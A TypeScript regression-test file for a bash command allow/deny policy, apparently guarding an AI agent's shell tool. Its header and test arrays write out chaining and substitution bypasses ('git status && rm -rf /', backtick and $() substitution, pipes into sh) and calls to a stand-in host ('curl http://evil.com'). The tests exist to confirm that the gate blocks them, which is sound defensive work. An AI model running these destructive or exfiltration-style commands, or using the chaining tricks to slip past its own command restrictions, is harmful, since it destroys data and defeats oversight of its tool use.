/**
 * Command-chaining bypass regression tests for enforceBashCommandPolicy.
 *
 * The allow/deny policy used to be a prefix match against the ENTIRE command
 * string. That let an allowed prefix smuggle a denied command past the gate via
 * shell chaining/substitution:
 *
 *   - "git status && rm -rf /"     (allowed prefix, then denied command)
 *   - "git status; curl evil.com"  (allowed prefix, then non-allowlisted command)
 *   - "git status | sh"            (pipe into a non-allowlisted interpreter)
 *   - "git status $(rm -rf /)"     (command substitution)
 *   - "git status `rm -rf /`"      (backtick substitution)
 *   - "git status\nrm -rf /"       (newline-separated)
 *
 * The fix splits on shell separators and applies the prefix check to EVERY
 * sub-command: deny if ANY segment is denied, and (when an allowlist is active)
 * require EVERY segment to match an allow prefix.
 */

import { describe, expect, test } from "bun:test";
import {
  type BashCommandPolicy,
  enforceBashCommandPolicy,
} from "../openclaw/tool-policy";

describe("enforceBashCommandPolicy command-chaining bypass", () => {
  const denyPolicy: BashCommandPolicy = {
    allowAll: true,
    allowPrefixes: [],
    denyPrefixes: ["rm "],
  };

  const denyChained = [
    "git status && rm -rf /",
    "git status ; rm -rf /",
    "git status || rm -rf /",
    "true | rm -rf /",
    "git status $(rm -rf /)",
    "git status `rm -rf /`",
    "git status\nrm -rf /",
    "git status & rm -rf /",
    "echo hi; echo hi; rm -rf /",
    "git log; sudo apt install evil", // deny via default package-manager prefix
    "cat <(rm -rf /)", // process substitution
    "diff <(echo a) >(rm -rf /)", // output process substitution
  ];

  for (const cmd of denyChained) {
    test(`denied segment is caught: ${JSON.stringify(cmd)}`, () => {
      const policy: BashCommandPolicy = cmd.includes("apt")
        ? {
            allowAll: true,
            allowPrefixes: [],
            denyPrefixes: ["rm ", "sudo apt "],
          }
        : denyPolicy;
      expect(() => enforceBashCommandPolicy(cmd, policy)).toThrow(
        "Bash command denied by policy"
      );
    });
  }

  const allowOnlyGit: BashCommandPolicy = {
    allowAll: false,
    allowPrefixes: ["git"],
    denyPrefixes: [],
  };

  const allowlistBypass = [
    "git status && curl http://evil.com",
    "git status; curl http://evil.com",
    "git status | sh",
    "git status $(curl http://evil.com)",
    "git status `curl http://evil.com`",
    "git status\ncurl http://evil.com",
  ];

  for (const cmd of allowlistBypass) {
    test(`non-allowlisted segment is rejected: ${JSON.stringify(cmd)}`, () => {
      expect(() => enforceBashCommandPolicy(cmd, allowOnlyGit)).toThrow(
        "Bash command not allowed by policy"
      );
    });
  }

  test("every segment matching the allowlist still passes", () => {
    const policy: BashCommandPolicy = {
      allowAll: false,
      allowPrefixes: ["git", "echo"],
      denyPrefixes: [],
    };
    expect(() =>
      enforceBashCommandPolicy("git status && echo done", policy)
    ).not.toThrow();
    expect(() =>
      enforceBashCommandPolicy("echo start; git pull | git apply", policy)
    ).not.toThrow();
  });

  test("a single allowed command (no chaining) still passes", () => {
    expect(() =>
      enforceBashCommandPolicy("git status", allowOnlyGit)
    ).not.toThrow();
  });

  test("chained allowed commands with one denied segment are rejected", () => {
    const policy: BashCommandPolicy = {
      allowAll: false,
      allowPrefixes: ["git", "echo"],
      denyPrefixes: ["git push"],
    };
    expect(() =>
      enforceBashCommandPolicy("echo deploying && git push origin main", policy)
    ).toThrow("Bash command denied by policy");
  });
});
